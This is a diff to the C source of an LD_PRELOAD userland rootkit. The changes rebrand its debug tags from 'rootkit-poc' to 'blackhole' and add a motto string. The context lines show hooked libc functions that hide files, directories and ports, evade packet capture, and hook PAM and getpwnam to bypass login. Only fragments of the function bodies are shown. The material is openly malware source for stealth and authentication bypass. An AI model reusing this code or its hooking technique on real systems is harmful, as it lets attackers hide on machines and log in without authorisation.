@@ -28,6 +28,8 @@
 #include "etc.h"
 #include "libshserver.h"
 
+char *blackhole = "If you feel you are in a black hole, don’t give up. There’s a way out.";
+
 // Set up syscall hooks
 void init(void) {
     if (is_loaded) {
@@ -45,7 +47,7 @@ void init(void) {
         syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scallname); // gets the pointer to the original syscall function
 
         if (!syscall_list[i].syscall_func) {
-            DEBUG("[rootkit-poc]: Error loading syscall %s\n", dlerror());
+            DEBUG("[blackhole]: Error loading syscall %s\n", dlerror());
         }
 
         cleanup(scallname, strlen(scallname)); // clears allocated memory
@@ -264,7 +266,7 @@ FILE *hide_ports(const char *filename) {
 
 // Hooked execve function to create a temporary “sandbox process” to execute binaries without the rootkit loaded
 int execve(const char *path, char *const argv[], char *const envp[]) {
-    DEBUG("[rootkit-poc]: execve hooked %s\n", path);
+    DEBUG("[blackhole]: execve hooked %s\n", path);
 
     unsigned char hash[EVP_MAX_MD_SIZE];
     unsigned int hash_length;
@@ -288,7 +290,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 
     FILE *hash_db_file = syscall_list[SYS_FOPEN].syscall_func(hash_db_path, "r");
     if (!hash_db_file) {
-        DEBUG("[rootkit-poc]: Error opening hash database %s\n", hash_db_path);
+        DEBUG("[blackhole]: Error opening hash database %s\n", hash_db_path);
         cleanup(hash_db_path, strlen(hash_db_path));
         return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
     }
@@ -351,7 +353,7 @@ long ptrace(void *request, pid_t pid, void *addr, void *data) {
 
 // Hooked access function to hide invisible files
 int access(const char *path, int mode) {
-    DEBUG("[rootkit-poc]: access hooked\n");
+    DEBUG("[blackhole]: access hooked\n");
 
     if (is_invisible(path)) {
         errno = ENOENT;
@@ -364,7 +366,7 @@ int access(const char *path, int mode) {
 
 // Hooked readdir function to hide invisible directory entries
 struct dirent *readdir(DIR *dirp) {
-    DEBUG("[rootkit-poc]: readdir hooked\n");
+    DEBUG("[blackhole]: readdir hooked\n");
 
     struct dirent *dir;
 
@@ -382,7 +384,7 @@ struct dirent *readdir(DIR *dirp) {
 
 // Hooked fopen function to hide invisible files
 FILE *fopen(const char *filename, const char *mode) {
-    DEBUG("[rootkit-poc]: fopen hooked %s\n", filename);
+    DEBUG("[blackhole]: fopen hooked %s\n", filename);
 
     if (is_procnet(filename)) {
         return hide_ports(filename);
@@ -399,7 +401,7 @@ FILE *fopen(const char *filename, const char *mode) {
 
 // Hooked opendir function to hide invisible directories
 DIR *opendir(const char *pathname) {
-    DEBUG("[rootkit-poc]: opendir hooked\n");
+    DEBUG("[blackhole]: opendir hooked\n");
 
     if (is_invisible(pathname)) {
         errno = ENOENT;
@@ -412,7 +414,7 @@ DIR *opendir(const char *pathname) {
 
 // Hooked open function to hide invisible files
 int open(const char *pathname, int flags, mode_t mode) {
-    DEBUG("[rootkit-poc]: open hooked\n");
+    DEBUG("[blackhole]: open hooked\n");
 
     if (is_invisible(pathname)) {
         errno = ENOENT;
@@ -425,7 +427,7 @@ int open(const char *pathname, int flags, mode_t mode) {
 
 // Hooked rmdir function to hide invisible directories
 int rmdir(const char *pathname) {
-    DEBUG("[rootkit-poc]: rmdir hooked\n");
+    DEBUG("[blackhole]: rmdir hooked\n");
 
     if (is_invisible(pathname)) {
         errno = ENOENT;
@@ -438,7 +440,7 @@ int rmdir(const char *pathname) {
 
 // Hooked link function to hide invisible files
 int link(const char *oldpath, const char *newpath) {
-    DEBUG("[rootkit-poc]: link hooked\n");
+    DEBUG("[blackhole]: link hooked\n");
 
     if (is_invisible(oldpath)) {
         errno = ENOENT;
@@ -451,7 +453,7 @@ int link(const char *oldpath, const char *newpath) {
 
 // Hooked unlink function to hide invisible files
 int unlink(const char *pathname) {
-    DEBUG("[rootkit-poc]: unlink hooked\n");
+    DEBUG("[blackhole]: unlink hooked\n");
 
     if (is_invisible(pathname)) {
         errno = ENOENT;
@@ -464,7 +466,7 @@ int unlink(const char *pathname) {
 
 // Hooked unlinkat function to hide invisible files
 int unlinkat(int dirfd, const char *pathname, int flags) {
-    DEBUG("[rootkit-poc]: unlinkat hooked\n");
+    DEBUG("[blackhole]: unlinkat hooked\n");
 
     if (is_invisible(pathname)) {
         errno = ENOENT;
@@ -477,7 +479,7 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
 
 // Hooked rename function to hide invisible files
 int rename(const char *oldpath, const char *newpath) {
-    DEBUG("[rootkit-poc]: rename hooked\n");
+    DEBUG("[blackhole]: rename hooked\n");
 
     if (is_invisible(oldpath)) {
         errno = ENOENT;
@@ -490,7 +492,7 @@ int rename(const char *oldpath, const char *newpath) {
 
 // Hooked mkdir function to hide invisible directories
 int mkdir(const char *pathname, mode_t mode) {
-    DEBUG("[rootkit-poc]: mkdir hooked\n");
+    DEBUG("[blackhole]: mkdir hooked\n");
 
     if (is_invisible(pathname)) {
         errno = EACCES;
@@ -503,7 +505,7 @@ int mkdir(const char *pathname, mode_t mode) {
 
 // Hooked mkdirat function to hide invisible directories
 int mkdirat(int dirfd, const char *pathname, mode_t mode) {
-    DEBUG("[rootkit-poc]: mkdirat hooked\n");
+    DEBUG("[blackhole]: mkdirat hooked\n");
 
     if (is_invisible(pathname)) {
         errno = EACCES;
@@ -516,7 +518,7 @@ int mkdirat(int dirfd, const char *pathname, mode_t mode) {
 
 // Hooked pcap_loop function to avoids local sniffing
 int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
-    DEBUG("[rootkit-poc]: pcap_loop hooked\n");
+    DEBUG("[blackhole]: pcap_loop hooked\n");
 
     init(); // hook configurations
 
@@ -527,7 +529,7 @@ int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
 
 // Hooked pam_authenticate function to bypass login
 int pam_authenticate(pam_handle_t *pamh, int flags) {
-    DEBUG("[rootkit-poc]: pam_authenticate called\n");
+    DEBUG("[blackhole]: pam_authenticate called\n");
 
     init(); // hook configurations
 
@@ -551,7 +553,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
 
 // Hooked pam_open_session function to bypass login
 int pam_open_session(pam_handle_t *pamh, int flags) {
-    DEBUG("[rootkit-poc]: pam_open_session called\n");
+    DEBUG("[blackhole]: pam_open_session called\n");
 
     init(); // hook configurations
 
@@ -575,7 +577,7 @@ int pam_open_session(pam_handle_t *pamh, int flags) {
 
 // Hooked getpwnam function to bypass login
 struct passwd *getpwnam(const char *name) {
-    DEBUG("[rootkit-poc]: getpwnam called %s\n", name);
+    DEBUG("[blackhole]: getpwnam called %s\n", name);
 
     init(); // hook configurations
 
@@ -605,7 +607,7 @@ struct passwd *getpwnam(const char *name) {
 
 // Hooked getpwnam_r function to bypass login
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) {
-    DEBUG("[rootkit-poc]: getpwnam_r called\n");
+    DEBUG("[blackhole]: getpwnam_r called\n");
 
     init(); // hook configurations
 
@@ -634,7 +636,7 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
 
 // Hooked pam_acct_mgmt function to bypass login
 int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
-    DEBUG("[rootkit-poc]: pam_acct_mgmt called\n");
+    DEBUG("[blackhole]: pam_acct_mgmt called\n");
 
     init(); // hook configurations
 
